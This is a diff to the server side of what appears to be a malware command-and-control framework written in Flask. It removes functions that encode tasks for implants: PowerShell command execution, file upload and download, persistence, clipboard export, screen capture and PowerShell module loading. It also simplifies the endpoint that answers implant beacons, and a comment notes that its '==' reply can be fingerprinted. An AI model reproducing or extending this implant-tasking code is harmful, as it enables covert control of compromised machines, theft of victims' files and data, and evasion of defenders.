@@ -15,96 +15,7 @@ db = Database()
 app = Flask(str(uuid4()))
 app.config['SECRET_KEY'] = str(uuid4())
 
-# Adding the functions which manage encoding built in commands for transfer
 
-def craft_sound_file(value_dict, command_id):
-    path = f"{os.getcwd()}/Storage/implant_resources/{value_dict['args']}"
-    with open(path, 'rb') as file:
-        audio = base64.standard_b64encode(file.read()).decode()
-        final_audio = f"{value_dict['type']}{command_id}{audio}"
-    return final_audio
-
-
-def craft_powershell_native_command(args, command_id):
-    a = base64.b64encode(args['args'].encode()).decode()
-    b = args['type'] + command_id + a
-    return b
-
-
-def craft_file_upload(value_dict, command_id):
-    # Temp dev work:
-    arg_dict = value_dict['args'].split(" ")
-    local_file = arg_dict[0]
-    target_location = arg_dict[1]
-    with open(os.getcwd() + "/Storage/implant_resources/" + local_file, 'rb') as file_h:
-        a = file_h.read()
-        b = base64.b64encode(a).decode()
-        final_str = base64.b64encode(target_location.encode()).decode() + "::" + b
-        final_str = base64.b64encode(final_str.encode()).decode()
-    cc = str(value_dict['type'] + command_id) + final_str
-    return cc
-
-
-def craft_file_download(value_dict, command_id):
-    encoded_target_file = base64.b64encode(value_dict['args'].encode()).decode()
-    to_return = f"{value_dict['type']}{command_id}{encoded_target_file}"
-    return str(to_return)
-
-
-def craft_enable_persistence(value_dict, command_id):
-    return str(value_dict['type'] + command_id)
-
-
-def craft_sys_info(value_dict, command_id):
-    return str(value_dict['type'] + command_id)
-
-
-def craft_export_clipboard(value_dict, command_id):
-    return str(value_dict['type'] + command_id)
-
-
-def craft_load_module(value_dict, command_id):
-    try:
-        with open(str(os.getcwd() + "/Storage/implant_resources/modules/" + value_dict['args'] + ".ps1"),
-                  'r') as fileh:
-            to_encode = f"{value_dict['args']}::{fileh.read()}"
-            load_module_string = "LM" + command_id + base64.b64encode(to_encode.encode()).decode()
-            return load_module_string
-    except Exception as e:
-
-        # These exceptions should be added to a log file.
-        print(f"Load module failed: {e}")
-        pass
-    return str("==")
-
-
-def craft_invoke_module(value_dict, command_id):
-    a = base64.b64encode(value_dict['args'].encode()).decode()
-    b = value_dict['type'] + command_id + a
-    return b
-
-
-def craft_list_modules(value_dict, command_id):
-    return str(value_dict['type'] + command_id)
-
-
-def craft_screen_capture(value_dict, command_id):
-    return str(value_dict['type'] + command_id)
-
-#
-preprocessing = {
-    "PS": craft_sound_file,
-    "CM": craft_powershell_native_command,
-    "UF": craft_file_upload,
-    "FD": craft_file_download,
-    "EP": craft_enable_persistence,
-    "SI": craft_sys_info,
-    "EC": craft_export_clipboard,
-    "LM": craft_load_module,
-    "IM": craft_invoke_module,
-    "ML": craft_list_modules,
-    "SC": craft_screen_capture
-}
 
 
 @app.before_request
@@ -136,10 +47,10 @@ def stager():
 def implant_beacon_endpoint():
     if 'X-Implant' not in request.headers:
         return "=="
-    next_cmd, command_id = Imp.issue_command(request.headers['X-Implant'], "BasicHttpProfile")
+    next_cmd = Imp.issue_command(request.headers['X-Implant'], "BasicHttpProfile")
     if next_cmd is not None:
-        processed_return_val = preprocessing[next_cmd['type']](next_cmd, command_id)
-        return processed_return_val
+        return next_cmd
+
     # Need to remove the use of == in beacons, this can be fingerprinted with ease.
     return "=="
 
